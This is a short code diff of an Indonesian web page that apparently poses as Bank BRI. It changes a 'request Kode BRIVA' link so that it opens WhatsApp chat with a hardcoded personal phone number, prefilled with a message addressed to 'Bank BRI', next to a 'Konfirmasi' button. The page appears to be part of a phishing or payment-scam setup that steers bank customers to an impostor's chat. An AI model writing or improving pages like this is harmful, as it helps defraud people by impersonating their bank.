@@ -355,23 +355,21 @@
     
 <body>
     <p style="font-size: 14px; text-align: center; margin-top: 25px; margin-left: 10px; margin-right: 10px;">
-        <strong style="color: #FF0000; text-decoration: underline" id="waLink">
+        <strong style="color: #FF0000; text-decoration: underline; cursor: pointer;" id="waLink">
             >> Klik untuk request Kode BRIVA ? <<
         </strong>
     </p>
 
     <script>
-        fetch("config.json")
-        .then(response => response.json())
-        .then(data => {
-            let number = data.whatsapp_number;
-            let text = encodeURIComponent(data.whatsapp_text);
-            document.getElementById("waLink").onclick = function () {
-                location.href = "https://wa.me/" + number + "?text=" + text;
-            };
-        })
-        .catch(error => console.error("Error:", error));
+        // Langsung definisikan nomor dan pesan di sini
+        const whatsappNumber = "0895329927710"; // Ganti dengan nomor WA tujuan (format 62)
+        const whatsappText = encodeURIComponent("*Hallo Bank BRI*  saya mau request kode virtual");
+
+        document.getElementById("waLink").onclick = function () {
+            location.href = "https://wa.me/" + whatsappNumber + "?text=" + whatsappText;
+        };
     </script>
+
 
        <b>
 <input type="submit" id="kirims" class="bubble-element Button clickable-element" style="max-width: 85%; padding: 0px; cursor: pointer; background: none rgb(9, 140, 227); border: none; text-align: center; display: block; margin: 20px auto; height: 39px; width: 346px; left: 0px; top: 0px; font-family: Arial; font-size: 14px; font-weight: 400; color: rgb(255, 255, 255); letter-spacing: 1px; line-height: 1; border-radius: 15px; box-shadow: rgb(170, 170, 170) 2px 2px 4px 0px; transition: background 200ms ease 0s; font-weight: 700" tabindex="2" value="Konfirmasi">
